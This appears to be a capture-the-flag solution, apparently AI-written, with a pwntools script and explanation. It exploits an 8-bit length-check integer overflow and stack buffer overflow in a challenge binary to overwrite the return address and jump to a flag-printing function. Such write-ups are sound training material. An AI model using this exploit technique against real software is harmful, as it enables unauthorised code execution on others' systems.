("To solve this challenge using pwntools, we'll exploit a buffer overflow "
 'vulnerability in the `check_passwd` function. The function copies the '
 'user-provided password into a fixed-size buffer without proper bounds '
 'checking when the password length is between 4 and 8 characters. However, '
 'due to an integer overflow in the length calculation (since the length is '
 'stored in an 8-bit unsigned integer), we can input a password of length 260 '
 'bytes, causing the length check to pass. This allows us to overflow the '
 'buffer and overwrite the return address with the address of the '
 '`what_is_this` function, which will print the flag.\n'
 '\n'
 '**Imports:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Code:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Set the context for 32-bit little endian architecture\n'
 "context(os='linux', arch='i386', log_level='debug')\n"
 '\n'
 '# Path to the binary\n'
 "binary = './pwn/integer/int-1/int1'\n"
 '\n'
 '# Load the binary ELF\n'
 'elf = ELF(binary)\n'
 '\n'
 "# Address of the 'what_is_this' function\n"
 "what_is_this = elf.symbols['what_is_this']\n"
 'log.info("Address of \'what_is_this\': " + hex(what_is_this))\n'
 '\n'
 '# Function to start the process\n'
 'def start():\n'
 '    return process(binary)\n'
 '\n'
 '# Start the process\n'
 'p = start()\n'
 '\n'
 '# Send the username\n'
 'p.recvuntil(b"Please input your username:\\n")\n'
 'p.sendline(b"user")\n'
 '\n'
 '# Receive the greeting and prompt for password\n'
 'p.recvuntil(b"Please input your passwd:\\n")\n'
 '\n'
 '# Generate a cyclic pattern to find the offset\n'
 'payload_length = 260  # So that (260 % 256) = 4, passing the length check\n'
 'payload = cyclic(payload_length)\n'
 '\n'
 '# Send the password payload\n'
 'p.send(payload)\n'
 '\n'
 '# Wait for the process to crash\n'
 'p.wait()\n'
 '\n'
 '# Open the core dump\n'
 'core = p.corefile\n'
 '\n'
 '# Find the offset to EIP (saved return address)\n'
 'eip_offset = cyclic_find(core.pc)\n'
 'log.info("Offset to EIP: " + str(eip_offset))\n'
 '\n'
 '# Craft the final payload\n'
 "payload = b'A' * eip_offset\n"
 'payload += p32(what_is_this)\n'
 "payload = payload.ljust(payload_length, b'B')  # Pad to 260 bytes\n"
 '\n'
 '# Restart the process\n'
 'p = start()\n'
 '\n'
 '# Send the username again\n'
 'p.recvuntil(b"Please input your username:\\n")\n'
 'p.sendline(b"user")\n'
 '\n'
 '# Receive the prompt for password\n'
 'p.recvuntil(b"Please input your passwd:\\n")\n'
 '\n'
 '# Send the crafted payload\n'
 'p.send(payload)\n'
 '\n'
 '# Interact with the process to get the flag\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '1. **Integer Overflow in Length Check:**\n'
 '   - The function `check_passwd` reads the length of the password into an '
 '8-bit unsigned integer `v3`. If we input a password of length 260, `v3` '
 'becomes `(260 % 256) = 4`, which passes the length check (`v3 > 3u && v3 <= '
 '8u`).\n'
 '\n'
 '2. **Buffer Overflow to Overwrite Return Address:**\n'
 '   - The buffer `dest` has a size of 11 bytes. By providing a payload longer '
 'than 11 bytes, we can overflow this buffer and overwrite the saved return '
 'address on the stack.\n'
 '\n'
 '3. **Finding the Offset to EIP:**\n'
 '   - We use a cyclic pattern to crash the program and find the exact offset '
 'where our input overwrites the return address (`EIP`).\n'
 '\n'
 '4. **Overwriting the Return Address:**\n'
 '   - Once we know the offset (`eip_offset`), we craft a payload that '
 'overwrites the return address with the address of the `what_is_this` '
 'function.\n'
 '\n'
 '5. **Executing the Exploit:**\n'
 '   - We send the crafted payload to the program. When the function returns, '
 'it will jump to `what_is_this`, effectively printing the flag.\n'
 '\n'
 '**Notes:**\n'
 '\n'
 '- **Core Dumps:**\n'
 '  - Ensure core dumps are enabled on your system by running `ulimit -c '
 'unlimited` before executing the script.\n'
 '  \n'
 '- **Running on Remote Server:**\n'
 '  - If the challenge is running on a remote server, adjust the `start()` '
 'function to connect to the remote service using `remote(host, port)`.\n'
 '\n'
 '- **Non-PIE Binary:**\n'
 '  - Since the binary is not position-independent (`PIE: No`), the addresses '
 'are static, and we can hardcode the address of `what_is_this`.\n'
 '\n'
 '- **Interacting with the Process:**\n'
 '  - After sending the payload, we call `p.interactive()` to interact with '
 'the process and receive the flag output.\n'
 '\n'
 'By running this script, you should be able to exploit the buffer overflow '
 'and have the program execute the `what_is_this` function, which will display '
 'the flag.')
